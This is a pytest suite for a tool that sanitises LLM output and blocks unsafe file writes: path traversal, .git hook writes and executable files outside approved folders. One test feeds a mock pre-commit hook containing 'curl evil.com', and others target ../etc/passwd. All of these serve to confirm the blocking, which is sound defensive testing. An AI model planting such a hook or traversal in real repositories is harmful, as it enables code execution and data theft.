"""Tests for lib/sanitize_output.py — LLM output sanitization and path validation."""
from __future__ import annotations

import json
import os
import sys
import textwrap
from pathlib import Path

import pytest

sys.path.insert(0, os.path.join(os.path.dirname(__file__), "..", "lib"))

import sanitize_output as so
from sanitize_output import (
    PathViolation,
    sanitize_content,
    safe_write_file,
    validate_write_path,
)


# ── Fixtures ───────────────────────────────────────────────────────────────────


@pytest.fixture()
def worktree(tmp_path: Path) -> Path:
    """Return a temp directory acting as a worktree root."""
    wt = tmp_path / "worktree"
    wt.mkdir()
    return wt


@pytest.fixture()
def audit_log(tmp_path: Path) -> Path:
    return tmp_path / ".spiral" / "security-audit.jsonl"


# ── sanitize_content ───────────────────────────────────────────────────────────


class TestSanitizeContent:
    def test_empty_string_is_noop(self):
        assert sanitize_content("") == ""

    def test_none_like_empty_returns_empty(self):
        # sanitize_content returns early for falsy content
        assert sanitize_content("") == ""

    def test_clean_python_code_unchanged(self):
        code = textwrap.dedent("""\
            def hello():
                print("Hello, world!")
            """)
        assert sanitize_content(code) == code

    def test_strips_null_bytes(self):
        raw = "line1\x00line2\x00\x00line3"
        assert sanitize_content(raw) == "line1line2line3"

    def test_strips_ansi_colour_codes(self):
        raw = "\x1b[32mGreen\x1b[0m"
        assert sanitize_content(raw) == "Green"

    def test_strips_ansi_bold(self):
        raw = "\x1b[1mBold\x1b[22m"
        assert sanitize_content(raw) == "Bold"

    def test_strips_ansi_cursor_sequences(self):
        raw = "hello\x1b[2Aworld"  # cursor up 2 lines
        assert sanitize_content(raw) == "helloworld"

    def test_strips_ansi_osc_title(self):
        raw = "\x1b]0;My Title\x07text"
        assert sanitize_content(raw) == "text"

    def test_strips_multiple_ansi_sequences(self):
        raw = "\x1b[31mRed\x1b[0m \x1b[1mBold\x1b[22m normal"
        assert sanitize_content(raw) == "Red Bold normal"

    def test_strips_combined_null_and_ansi(self):
        raw = "\x1b[32mhello\x00world\x1b[0m"
        assert sanitize_content(raw) == "helloworld"

    def test_preserves_string_literal_ansi_escape_notation(self):
        """Python source with ANSI as string data must NOT be touched.

        In source code the ANSI sequences appear as literal text ``\\x1b[32m``
        (backslash + x + 1 + b + ...) rather than an actual ESC byte (0x1b).
        The sanitizer must leave those string literals intact.
        """
        code = textwrap.dedent(r'''
            RESET = "\x1b[0m"
            GREEN = "\x1b[32m"

            def coloured(text: str) -> str:
                return f"{GREEN}{text}{RESET}"
            ''')
        # No actual ESC bytes present — sanitizer should leave code unchanged
        assert sanitize_content(code) == code

    def test_preserves_actual_raw_string_comment(self):
        """Comments describing ANSI sequences should survive."""
        code = "# Strip \\x1b[32m from terminal output\n"
        assert sanitize_content(code) == code

    def test_strips_actual_esc_bytes_in_docstring(self):
        """Actual ESC bytes embedded anywhere in a file are stripped."""
        raw = 'def f():\n    """Doc with \x1b[1mformatting\x1b[0m."""\n    pass\n'
        result = sanitize_content(raw)
        assert "\x1b" not in result
        assert "formatting" in result

    def test_multiline_content_with_mixed_issues(self):
        raw = "line1\n\x1b[33mwarn\x1b[0m\nline2\x00line3\n"
        result = sanitize_content(raw)
        assert "\x1b" not in result
        assert "\x00" not in result
        assert "warn" in result


# ── validate_write_path ────────────────────────────────────────────────────────


class TestValidateWritePath:
    def test_valid_path_returns_resolved(self, worktree: Path):
        target = worktree / "src" / "foo.py"
        target.parent.mkdir(parents=True, exist_ok=True)
        result = validate_write_path(target, worktree)
        assert result == target.resolve()

    def test_path_inside_worktree_passes(self, worktree: Path):
        target = worktree / "tests" / "test_bar.py"
        # File doesn't need to exist for validate (only for write)
        validate_write_path(target, worktree)  # should not raise

    def test_path_traversal_blocked(self, worktree: Path):
        target = worktree / ".." / "etc" / "passwd"
        with pytest.raises(PathViolation) as exc_info:
            validate_write_path(target, worktree)
        assert exc_info.value.violation_type == "path_traversal"

    def test_absolute_path_outside_worktree_blocked(self, worktree: Path, tmp_path: Path):
        outside = tmp_path / "outside" / "file.py"
        with pytest.raises(PathViolation) as exc_info:
            validate_write_path(outside, worktree)
        assert exc_info.value.violation_type == "path_traversal"

    def test_git_dir_write_blocked(self, worktree: Path, audit_log: Path):
        target = worktree / ".git" / "hooks" / "pre-commit"
        with pytest.raises(PathViolation) as exc_info:
            validate_write_path(target, worktree, audit_log=audit_log)
        assert exc_info.value.violation_type == "git_dir_write"

    def test_git_dir_write_logged_to_audit(self, worktree: Path, audit_log: Path):
        target = worktree / ".git" / "config"
        with pytest.raises(PathViolation):
            validate_write_path(target, worktree, audit_log=audit_log)
        assert audit_log.exists()
        entry = json.loads(audit_log.read_text().splitlines()[0])
        assert entry["event"] == "git_dir_write_blocked"
        assert ".git" in entry["target"]

    def test_git_hooks_write_blocked(self, worktree: Path):
        target = worktree / ".git" / "hooks" / "post-receive"
        with pytest.raises(PathViolation) as exc_info:
            validate_write_path(target, worktree)
        assert exc_info.value.violation_type == "git_dir_write"

    def test_exec_outside_safe_dir_blocked_by_default(self, worktree: Path, audit_log: Path):
        target = worktree / "deploy" / "setup.sh"
        with pytest.raises(PathViolation) as exc_info:
            validate_write_path(target, worktree, audit_log=audit_log)
        assert exc_info.value.violation_type == "exec_write"

    def test_exec_in_src_allowed(self, worktree: Path):
        target = worktree / "src" / "main.py"
        validate_write_path(target, worktree)  # should not raise

    def test_exec_in_tests_allowed(self, worktree: Path):
        target = worktree / "tests" / "test_main.py"
        validate_write_path(target, worktree)  # should not raise

    def test_exec_in_lib_allowed(self, worktree: Path):
        target = worktree / "lib" / "utils.py"
        validate_write_path(target, worktree)  # should not raise

    def test_exec_in_scripts_allowed(self, worktree: Path):
        target = worktree / "scripts" / "build.sh"
        validate_write_path(target, worktree)  # should not raise

    def test_exec_outside_safe_dir_allowed_with_flag(self, worktree: Path):
        target = worktree / "deploy" / "setup.sh"
        validate_write_path(target, worktree, allow_exec_writes=True)  # no raise

    def test_exec_outside_safe_dir_allowed_with_env_var(self, worktree: Path, monkeypatch):
        monkeypatch.setenv("SPIRAL_ALLOW_EXEC_WRITES", "true")
        target = worktree / "deploy" / "setup.sh"
        validate_write_path(target, worktree)  # no raise

    def test_exec_env_var_case_insensitive(self, worktree: Path, monkeypatch):
        monkeypatch.setenv("SPIRAL_ALLOW_EXEC_WRITES", "TRUE")
        target = worktree / "hack" / "evil.py"
        validate_write_path(target, worktree)  # no raise

    def test_exec_env_var_1_value(self, worktree: Path, monkeypatch):
        monkeypatch.setenv("SPIRAL_ALLOW_EXEC_WRITES", "1")
        target = worktree / "random" / "script.sh"
        validate_write_path(target, worktree)  # no raise

    def test_non_exec_extension_anywhere_allowed(self, worktree: Path):
        target = worktree / "docs" / "README.md"
        validate_write_path(target, worktree)  # no raise

    def test_exec_blocked_logged_to_audit(self, worktree: Path, audit_log: Path):
        target = worktree / "infra" / "deploy.sh"
        with pytest.raises(PathViolation):
            validate_write_path(target, worktree, audit_log=audit_log)
        assert audit_log.exists()
        entry = json.loads(audit_log.read_text().splitlines()[0])
        assert entry["event"] == "exec_write_blocked"

    def test_path_traversal_logged_to_audit(self, worktree: Path, audit_log: Path):
        target = worktree / ".." / "etc" / "passwd"
        with pytest.raises(PathViolation):
            validate_write_path(target, worktree, audit_log=audit_log)
        assert audit_log.exists()
        entry = json.loads(audit_log.read_text().splitlines()[0])
        assert entry["event"] == "path_traversal_blocked"

    def test_audit_log_parent_dir_created(self, worktree: Path, tmp_path: Path):
        nested_log = tmp_path / "deep" / "nested" / "audit.jsonl"
        target = worktree / ".git" / "hooks" / "post-commit"
        with pytest.raises(PathViolation):
            validate_write_path(target, worktree, audit_log=nested_log)
        assert nested_log.exists()

    def test_worktree_root_itself_not_traversal(self, worktree: Path):
        # Writing to root is fine (no .git, no exec)
        target = worktree / "data.json"
        validate_write_path(target, worktree)  # no raise


# ── safe_write_file ────────────────────────────────────────────────────────────


class TestSafeWriteFile:
    def test_writes_clean_content(self, worktree: Path):
        target = worktree / "src" / "hello.py"
        content = 'print("hello")\n'
        result = safe_write_file(target, content, worktree)
        assert result == target.resolve()
        assert target.read_text() == content

    def test_strips_ansi_before_writing(self, worktree: Path):
        target = worktree / "src" / "out.txt"
        raw = "\x1b[32mhello\x1b[0m world"
        safe_write_file(target, raw, worktree)
        assert target.read_text() == "hello world"

    def test_strips_null_bytes_before_writing(self, worktree: Path):
        target = worktree / "src" / "data.py"
        raw = "x = 1\x00\x00\n"
        safe_write_file(target, raw, worktree)
        assert "\x00" not in target.read_text()

    def test_creates_parent_dirs(self, worktree: Path):
        target = worktree / "src" / "deep" / "module" / "file.py"
        safe_write_file(target, "# code\n", worktree)
        assert target.exists()

    def test_blocks_path_traversal(self, worktree: Path, tmp_path: Path):
        outside = tmp_path / "evil.py"
        with pytest.raises(PathViolation) as exc_info:
            safe_write_file(outside, "malicious", worktree)
        assert exc_info.value.violation_type == "path_traversal"

    def test_blocks_git_dir_write(self, worktree: Path):
        target = worktree / ".git" / "hooks" / "pre-commit"
        with pytest.raises(PathViolation) as exc_info:
            safe_write_file(target, "#!/bin/bash\ncurl evil.com", worktree)
        assert exc_info.value.violation_type == "git_dir_write"
        # File must NOT have been written
        assert not target.exists()

    def test_blocks_exec_outside_safe_dir(self, worktree: Path):
        target = worktree / "ops" / "deploy.sh"
        with pytest.raises(PathViolation):
            safe_write_file(target, "#!/bin/bash\n", worktree)
        assert not target.exists()

    def test_exec_write_with_allow_flag(self, worktree: Path):
        target = worktree / "ops" / "deploy.sh"
        safe_write_file(target, "#!/bin/bash\n", worktree, allow_exec_writes=True)
        assert target.exists()

    def test_atomic_write_no_tmp_left_on_success(self, worktree: Path):
        target = worktree / "src" / "file.py"
        safe_write_file(target, "x = 1\n", worktree)
        tmp = target.with_suffix(".py.tmp")
        assert not tmp.exists()

    def test_python_file_with_ansi_string_literals_preserved(self, worktree: Path):
        """Acceptance criterion: ANSI as string data in Python source is untouched."""
        code = textwrap.dedent(r'''
            RED = "\x1b[31m"
            RESET = "\x1b[0m"

            def red(text):
                return f"{RED}{text}{RESET}"
            ''')
        target = worktree / "src" / "colours.py"
        safe_write_file(target, code, worktree)
        written = target.read_text()
        # The string escape notation must survive unchanged
        assert r"\x1b[31m" in written
        assert r"\x1b[0m" in written

    def test_audit_log_written_on_git_block(self, worktree: Path, audit_log: Path):
        target = worktree / ".git" / "config"
        with pytest.raises(PathViolation):
            safe_write_file(target, "evil", worktree, audit_log=audit_log)
        assert audit_log.exists()
        entries = [json.loads(l) for l in audit_log.read_text().splitlines() if l]
        assert any(e["event"] == "git_dir_write_blocked" for e in entries)

    def test_string_content_encoding(self, worktree: Path):
        target = worktree / "src" / "unicode.py"
        content = "# 你好世界\nprint('hello')\n"
        safe_write_file(target, content, worktree, encoding="utf-8")
        assert target.read_text(encoding="utf-8") == content


# ── PathViolation exception ────────────────────────────────────────────────────


class TestPathViolation:
    def test_has_violation_type(self, worktree: Path):
        target = worktree / ".git" / "hooks" / "pre-commit"
        with pytest.raises(PathViolation) as exc_info:
            validate_write_path(target, worktree)
        exc = exc_info.value
        assert exc.violation_type == "git_dir_write"
        assert exc.target
        assert exc.worktree_root

    def test_message_in_str(self, worktree: Path, tmp_path: Path):
        outside = tmp_path / "foo.py"
        with pytest.raises(PathViolation) as exc_info:
            validate_write_path(outside, worktree)
        assert "path_traversal" in exc_info.value.violation_type
        assert str(exc_info.value)


# ── CLI integration ────────────────────────────────────────────────────────────


class TestCLICheckPath:
    def test_check_path_valid(self, worktree: Path, capsys):
        target = str(worktree / "src" / "main.py")
        sys.argv = ["sanitize_output.py", "check-path", "--path", target, "--worktree", str(worktree)]
        # Should exit 0 (no raise)
        so.main()  # no sys.exit called on success

    def test_check_path_git_dir_exits_1(self, worktree: Path):
        target = str(worktree / ".git" / "hooks" / "pre-commit")
        sys.argv = ["sanitize_output.py", "check-path", "--path", target, "--worktree", str(worktree)]
        with pytest.raises(SystemExit) as exc_info:
            so.main()
        assert exc_info.value.code == 1

    def test_sanitize_stdin_writes_file(self, worktree: Path, monkeypatch, tmp_path):
        import io
        raw = "\x1b[32mhello\x1b[0m world\n"
        monkeypatch.setattr("sys.stdin", io.StringIO(raw))
        out_path = str(worktree / "src" / "out.txt")
        sys.argv = [
            "sanitize_output.py", "sanitize",
            "--output", out_path,
            "--worktree", str(worktree),
        ]
        so.main()
        assert Path(out_path).read_text() == "hello world\n"

    def test_sanitize_stdin_blocked_exits_1(self, worktree: Path, monkeypatch):
        import io
        monkeypatch.setattr("sys.stdin", io.StringIO("evil"))
        # Write to .git/
        out_path = str(worktree / ".git" / "config")
        sys.argv = [
            "sanitize_output.py", "sanitize",
            "--output", out_path,
            "--worktree", str(worktree),
        ]
        with pytest.raises(SystemExit) as exc_info:
            so.main()
        assert exc_info.value.code == 1
